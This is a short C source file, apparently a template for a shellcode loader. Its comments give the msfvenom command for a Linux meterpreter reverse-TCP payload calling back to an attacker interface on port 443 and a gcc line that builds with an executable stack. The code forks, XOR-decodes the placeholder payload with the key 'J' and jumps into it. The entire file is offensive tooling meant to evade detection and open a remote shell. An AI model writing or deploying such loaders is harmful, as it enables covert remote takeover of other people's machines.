#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// gcc -z execstack -static -o shell.o shell.c
int main (int argc, char **argv)
{
    // msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=tun0 LPORT=443  -f c
    // xor with "J"
    {{shellcode}}

    if (fork() == 0){
        char xor_key = 'J';
        int arraysize = (int) sizeof(buf); 
        for (int i=0; i<arraysize-1; i++) {
            buf[i] = buf[i]^xor_key; 
        }
        int (*ret)() = (int(*)())buf;
        ret(); 
    }
}